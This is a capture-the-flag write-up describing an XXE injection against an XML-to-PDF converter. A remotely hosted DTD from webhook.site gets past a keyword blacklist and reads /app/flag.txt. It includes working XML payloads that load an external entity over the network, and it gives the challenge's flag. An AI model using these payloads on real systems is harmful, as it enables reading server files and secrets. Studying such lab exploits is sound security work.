# 🌐 Category: Web / XML / XXE Injection

#technique/xxe #vulnerability/out-of-band #vulnerability/bypass #tool/webhook-site #category/web

---

## 📘 Description

The application is a utility designed to convert custom XML files (with a `.pasx` extension) into PDF documents. Although it includes a `sanitize` function intended to block keywords such as `flag`, `etc`, or `file`, the XML processor (`lxml`) is misconfigured. This allows for an **XML External Entity (XXE)** injection by leveraging an external DTD to bypass local word filters and read files from the server's filesystem.

---

## 🛠 Tools Used

- **Code Analysis:** Python (`app.py`, `Dockerfile`).
- **External Listener:** Webhook.site (to host the malicious DTD).
- **Text Editor:** `nano` / `cat`.
- **Browser:** For file upload and PDF retrieval.

---

## ⚙️ Methodology

### 1. Initial Recon

- **Code Audit:** Analyzing `app.py` revealed the use of the `lxml` library with `resolve_entities=True` and `no_network=False`. This configuration is the root cause of the XXE vulnerability.
- **Filter Logic:** The `sanitize` function uses a blacklist of forbidden words (`flag`, `etc`, `file`, `pascal`).
- **Environment:** The `Dockerfile` confirmed the flag's location at `/app/flag.txt`, which is readable by the application user.

### 2. Vulnerability Discovery (XXE Bypass)

- The XML parser resolves external entities **before** the `sanitize` function processes the content of the uploaded file.
- By hosting a DTD externally, the forbidden keywords are never present in the local `.pasx` file, effectively bypassing the security check.
    

### 3. Exploitation (Data Extraction)

**Step A: Hosting the External DTD** A response was configured on Webhook.site to serve a DTD file that defines the sensitive file path:

![[01Web_PDFile.png]]

```xml
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
```

**Step B: Creating the `.pasx` Payload** I created an XML file that calls the external DTD. This avoids using blocked words in the local file to prevent triggering the `sanitize` filter:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://webhook.site/900ca284-4d3c-4ac0-a24e-53c07cb6ec28">
  %remote;
]>
<root>
  <title>&xxe;</title>
  <author>dsmcamila</author>
</root>
```

### 4. PDF Generation

- Upon uploading the file, the server made a GET request to Webhook.site, downloaded the entity definition, and read `/app/flag.txt`.
- The content of the flag was successfully injected into the `title` field of the book data object.
- The `reportlab` engine then generated the PDF, displaying the flag in the document's title.

---

## 🏁 Flag

`pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}`

![[PDFile_Flag.pdf]]